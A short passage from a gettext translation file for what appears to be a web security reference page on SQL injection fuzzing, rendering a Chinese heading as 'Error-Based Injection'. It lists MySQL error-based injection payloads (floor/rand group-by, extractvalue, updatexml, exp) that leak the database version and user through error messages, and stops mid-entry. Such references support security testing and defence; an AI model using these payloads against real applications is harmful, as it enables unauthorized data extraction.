#: ../../source/vuln/sql/fuzz.rst:40
msgid "报错注入"
msgstr "Error-Based Injection"

#: ../../source/vuln/sql/fuzz.rst:41
msgid "``select 1/0``"
msgstr "``select 1/0``"

#: ../../source/vuln/sql/fuzz.rst:42
msgid ""
"``select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from"
"  information_schema.tables group by x)a``"
msgstr ""
"``select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from"
"  information_schema.tables group by x)a``"

#: ../../source/vuln/sql/fuzz.rst:43
msgid "``extractvalue(1, concat(0x5c,(select user())))``"
msgstr "``extractvalue(1, concat(0x5c,(select user())))``"

#: ../../source/vuln/sql/fuzz.rst:44
msgid "``updatexml(0x3a,concat(1,(select user())),1)``"
msgstr "``updatexml(0x3a,concat(1,(select user())),1)``"

#: ../../source/vuln/sql/fuzz.rst:45
msgid "``exp(~(SELECT * from(select user())a))``"
msgstr "``exp(~(SELECT * from(select user())a))``"

#: ../../source/vuln/sql/fuzz.rst:46
